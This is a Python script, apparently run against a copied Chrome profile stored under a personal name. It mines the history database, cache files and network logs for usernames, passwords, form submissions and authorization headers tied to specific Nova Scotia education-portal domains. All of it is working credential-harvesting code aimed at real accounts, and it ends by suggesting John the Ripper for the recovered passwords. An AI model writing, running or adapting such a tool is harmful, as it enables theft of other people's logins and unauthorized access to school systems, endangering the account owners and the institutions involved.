#!/usr/bin/env python3
import os
import sqlite3
import json
import re
import sys
from pathlib import Path
import binascii
import base64
from urllib.parse import parse_qs, urlparse, unquote

# Paths to Chrome data files
CHROME_PATH = "/workspaces/JaiziahGreene/Lil samson bro/Local/Google/Chrome/User Data"
HISTORY_DB = os.path.join(CHROME_PATH, "Default", "History")
CACHE_PATH = os.path.join(CHROME_PATH, "Default", "Cache")
NETWORK_PATH = os.path.join(CHROME_PATH, "Default", "Network")

# Target domains we're specifically interested in
TARGET_DOMAINS = [
    "sishrsb.ednet.ns.ca",
    "gnspes.ca",
    "everyone.ednet.ns.ca", 
    "saml.nspes.ca"
]

def copy_db_for_access(db_path, copy_path):
    """Create a copy of an SQLite database file to avoid locks"""
    import shutil
    try:
        shutil.copy2(db_path, copy_path)
        return True
    except Exception as e:
        print(f"Error copying database {db_path}: {e}")
        return False

def extract_history_data():
    """Extract data from Chrome's History database"""
    # Create a copy of the database to prevent locking issues
    temp_history_db = "/tmp/temp_history.db"
    if not copy_db_for_access(HISTORY_DB, temp_history_db):
        return []
    
    visits = []
    try:
        conn = sqlite3.connect(temp_history_db)
        cursor = conn.cursor()
        
        # Query for URLs containing our target domains with detailed visit info
        for domain in TARGET_DOMAINS:
            query = """
            SELECT u.url, u.title, v.visit_time, u.visit_count, u.typed_count, u.last_visit_time
            FROM urls u
            JOIN visits v ON u.id = v.url
            WHERE u.url LIKE ?
            ORDER BY v.visit_time DESC
            """
            cursor.execute(query, (f'%{domain}%',))
            
            for row in cursor.fetchall():
                url, title, visit_time, visit_count, typed_count, last_visit_time = row
                visits.append({
                    'url': url,
                    'title': title,
                    'visit_time': visit_time,
                    'visit_count': visit_count,
                    'typed_count': typed_count,
                    'last_visit_time': last_visit_time
                })
        
        # Look for form submissions (POST requests likely containing credentials)
        query = """
        SELECT u.url, u.title, f.url, f.transition
        FROM urls u
        JOIN visits v ON u.id = v.url
        JOIN visits f ON v.id = f.from_visit
        """
        cursor.execute(query)
        
        form_submissions = []
        for row in cursor.fetchall():
            url, title, from_url, transition = row
            # Transition type 7 is form submission
            # Check if it's related to our target domains
            if transition == 7 and any(domain in url for domain in TARGET_DOMAINS):
                form_submissions.append({
                    'url': url,
                    'title': title,
                    'from_url': from_url,
                    'transition': transition
                })
        
        conn.close()
        os.remove(temp_history_db)
        return visits, form_submissions
    
    except Exception as e:
        print(f"Error querying History database: {e}")
        try:
            conn.close()
        except:
            pass
        try:
            os.remove(temp_history_db)
        except:
            pass
        return [], []

def scan_cache_for_credentials():
    """Scan Chrome cache for possible login related data"""
    login_data = []
    
    # Check if Cache directory exists
    if not os.path.exists(CACHE_PATH):
        print(f"Cache directory not found: {CACHE_PATH}")
        return login_data
    
    try:
        # Look for cache files that might contain login data
        for root, dirs, files in os.walk(CACHE_PATH):
            for file in files:
                file_path = os.path.join(root, file)
                
                # Skip files that are too large
                if os.path.getsize(file_path) > 1024*1024:  # Skip files larger than 1MB
                    continue
                    
                try:
                    with open(file_path, 'rb') as f:
                        content = f.read()
                        
                        # Convert binary to text to search for keywords
                        try:
                            text_content = content.decode('utf-8', errors='ignore')
                            
                            # Look for patterns indicating credentials
                            # First check if the content is related to our target domains
                            if any(domain in text_content for domain in TARGET_DOMAINS):
                                # Look for common auth-related keywords
                                auth_keywords = [
                                    'password', 'passwd', 'pass=', 'pwd=', 'token=', 
                                    'authorization:', 'auth=', 'credential', 'login', 
                                    'username', 'user=', 'email=', 'session'
                                ]
                                
                                if any(keyword in text_content.lower() for keyword in auth_keywords):
                                    # Check for POST data or JSON containing credentials
                                    login_related = {
                                        'file': file_path,
                                        'size': os.path.getsize(file_path),
                                        'content_preview': text_content[:500] + ('...' if len(text_content) > 500 else '')
                                    }
                                    
                                    # Try to extract specific credential patterns
                                    password_pattern = re.compile(r'(?:password|passwd|pwd)[\s:"\'=]+([^&"\'\s]{3,50})')
                                    username_pattern = re.compile(r'(?:username|user|email|login|id)[\s:"\'=]+([^&"\'\s]{3,50})')
                                    
                                    pwd_matches = password_pattern.findall(text_content)
                                    user_matches = username_pattern.findall(text_content)
                                    
                                    if pwd_matches:
                                        login_related['possible_passwords'] = pwd_matches
                                    if user_matches:
                                        login_related['possible_usernames'] = user_matches
                                        
                                    login_data.append(login_related)
                                    
                                    # Look specifically for form submissions
                                    if 'Content-Type: application/x-www-form-urlencoded' in text_content:
                                        # Extract POST body data
                                        post_pattern = re.compile(r'\r\n\r\n(.*?)$', re.DOTALL)
                                        post_match = post_pattern.search(text_content)
                                        if post_match:
                                            post_body = post_match.group(1)
                                            login_related['form_data'] = post_body
                                            
                                            # Try to parse form-urlencoded data
                                            try:
                                                form_data = {}
                                                for pair in post_body.split('&'):
                                                    if '=' in pair:
                                                        key, value = pair.split('=', 1)
                                                        form_data[key] = unquote(value)
                                                login_related['parsed_form_data'] = form_data
                                            except:
                                                pass
                        except:
                            # Binary file couldn't be decoded as text
                            pass
                            
                except Exception as e:
                    print(f"Error reading cache file {file_path}: {e}")
                    
    except Exception as e:
        print(f"Error scanning cache: {e}")
        
    return login_data

def scan_network_log():
    """Scan Chrome's network logs for login-related traffic"""
    network_data = []
    
    # Check if Network directory exists
    if not os.path.exists(NETWORK_PATH):
        print(f"Network log directory not found: {NETWORK_PATH}")
        return network_data
    
    try:
        # Look through network log files
        for root, dirs, files in os.walk(NETWORK_PATH):
            for file in files:
                file_path = os.path.join(root, file)
                
                try:
                    with open(file_path, 'rb') as f:
                        content = f.read()
                        
                        # Try to decode as text
                        try:
                            text_content = content.decode('utf-8', errors='ignore')
                            
                            # Check if related to our target domains
                            if any(domain in text_content for domain in TARGET_DOMAINS):
                                # Look for authentication related data
                                auth_related = {
                                    'file': file_path,
                                    'size': os.path.getsize(file_path),
                                    'content_preview': text_content[:500] + ('...' if len(text_content) > 500 else '')
                                }
                                
                                # Look for specific authentication patterns
                                auth_header = re.search(r'Authorization:\s*(\S+)', text_content)
                                if auth_header:
                                    auth_related['auth_header'] = auth_header.group(1)
                                    
                                # Look for JSON with possible credentials
                                json_pattern = re.compile(r'({[^{}]*(?:{[^{}]*}[^{}]*)*})')
                                json_matches = json_pattern.findall(text_content)
                                
                                for json_str in json_matches:
                                    try:
                                        # Try to parse as JSON
                                        j = json.loads(json_str)
                                        # Check if JSON contains auth-related keys
                                        auth_keys = ['password', 'passwd', 'token', 'auth', 'credential', 
                                                    'login', 'username', 'user', 'email', 'session']
                                        
                                        if any(key in json_str.lower() for key in auth_keys):
                                            auth_related['json_data'] = json_str
                                            break
                                    except:
                                        # Not valid JSON
                                        pass
                                
                                network_data.append(auth_related)
                        except:
                            # Binary file couldn't be decoded as text
                            pass
                            
                except Exception as e:
                    print(f"Error reading network log file {file_path}: {e}")
    
    except Exception as e:
        print(f"Error scanning network logs: {e}")
        
    return network_data

def extract_post_request_data(file_path):
    """Attempt to extract POST request data from a file"""
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
            text_content = content.decode('utf-8', errors='ignore')
            
            # Look for HTTP POST requests
            post_match = re.search(r'POST\s+([^\s]+).*?Content-Type:[^\n]+\r\n\r\n(.*?)(?:\r\n\r\n|$)', 
                                 text_content, re.DOTALL)
            
            if post_match:
                url = post_match.group(1)
                body = post_match.group(2)
                
                return {
                    'url': url,
                    'body': body,
                    'file': file_path
                }
            
            return None
    except Exception as e:
        print(f"Error extracting POST data from {file_path}: {e}")
        return None

def main():
    print("===== Educational Portal Login Information Extractor =====")
    print(f"Looking for login data related to: {', '.join(TARGET_DOMAINS)}")
    
    # Extract history data
    print("\n[1] Analyzing Chrome History...")
    visit_data, form_submissions = extract_history_data()
    
    print(f"Found {len(visit_data)} visits to target domains")
    print(f"Found {len(form_submissions)} form submissions to target domains")
    
    # Print visit data
    if visit_data:
        print("\n----- Visits to Target Domains -----")
        for i, visit in enumerate(visit_data[:20]):  # Limit to 20 entries
            print(f"{i+1}. {visit['url']}")
            print(f"   Title: {visit['title']}")
            print(f"   Visit count: {visit['visit_count']}")
            print()
    
    # Print form submissions in detail
    if form_submissions:
        print("\n----- Form Submissions (Possible Login Attempts) -----")
        for i, form in enumerate(form_submissions):
            print(f"{i+1}. Submitted to: {form['url']}")
            print(f"   From page: {form['from_url']}")
            print(f"   Page title: {form['title']}")
            print()
    
    # Scan cache for credential data
    print("\n[2] Scanning Chrome Cache for login information...")
    cache_data = scan_cache_for_credentials()
    
    if cache_data:
        print(f"Found {len(cache_data)} cache files potentially containing login information")
        print("\n----- Potential Login Data in Cache -----")
        
        for i, data in enumerate(cache_data):
            print(f"{i+1}. File: {data['file']}")
            print(f"   Size: {data['size']} bytes")
            
            if 'possible_usernames' in data:
                print(f"   Possible usernames: {', '.join(data['possible_usernames'])}")
            
            if 'possible_passwords' in data:
                print(f"   Possible passwords: {', '.join(data['possible_passwords'])}")
            
            if 'parsed_form_data' in data:
                print("   Form data:")
                for key, value in data['parsed_form_data'].items():
                    print(f"      {key}: {value}")
            
            print(f"   Preview: {data['content_preview'][:200]}...")
            print()
    
    # Scan network logs
    print("\n[3] Scanning Chrome Network Logs...")
    network_data = scan_network_log()
    
    if network_data:
        print(f"Found {len(network_data)} network log entries potentially containing login information")
        print("\n----- Potential Login Data in Network Logs -----")
        
        for i, data in enumerate(network_data):
            print(f"{i+1}. File: {data['file']}")
            
            if 'auth_header' in data:
                print(f"   Authorization header: {data['auth_header']}")
            
            if 'json_data' in data:
                print(f"   JSON data: {data['json_data'][:200]}...")
            
            print(f"   Preview: {data['content_preview'][:200]}...")
            print()
    
    # Attempt to extract any clear text credentials
    print("\n[4] Looking for clear text credentials...")
    all_possible_passwords = []
    
    # Extract from cache data
    for data in cache_data:
        if 'possible_passwords' in data:
            all_possible_passwords.extend(data['possible_passwords'])
    
    # Print potential passwords
    if all_possible_passwords:
        print("Potential passwords found in clear text:")
        for pwd in set(all_possible_passwords):  # Remove duplicates
            print(f"- {pwd}")
    else:
        print("No clear text passwords found.")
        
    # Suggest next steps
    print("\n===== Suggested Next Steps =====")
    print("1. Review form submissions to identify login pages")
    print("2. Check cache files with 'possible_passwords' for cleartext credentials")
    print("3. Examine network logs for authorization tokens")
    print("4. Use John the Ripper with the extracted potential passwords")

if __name__ == "__main__":
    main()
